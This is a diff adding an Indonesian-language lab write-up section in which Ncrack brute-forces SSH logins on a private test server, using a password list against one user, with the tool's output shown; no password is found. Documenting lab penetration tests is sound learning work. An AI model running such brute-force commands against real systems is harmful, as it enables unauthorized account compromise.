@@ -122,8 +122,22 @@ Ncrack finished.
 
 ### Uji penetrasi menggunakan Ncrack
 
-* -
-* -
+* Untuk melakukan uji penetrasi pada server uji coba, kita perlu mengetahui IPnya. di sini sudah diketahui IP server target adalah 192.168.145.132.
+
+```
+~$ ncrack -p 22 -user ggg -P password-lib-list.txt 192.168.145.132
+
+Starting Ncrack 0.4ALPHA ( http://ncrack.org ) at 2016-07-01 23:21 WIB
+
+Discovered credentials for ssh on 192.168.145.132 22/tcp:
+
+
+Ncrack done:1 service scanner in 24.14 seconds.
+
+Ncrack finished.
+```
+
+* dari penetrasi di atas tidak terlihat password seperti penetrasi yang sebelumnya.
 
 ## Kesimpulan dan Saran
 
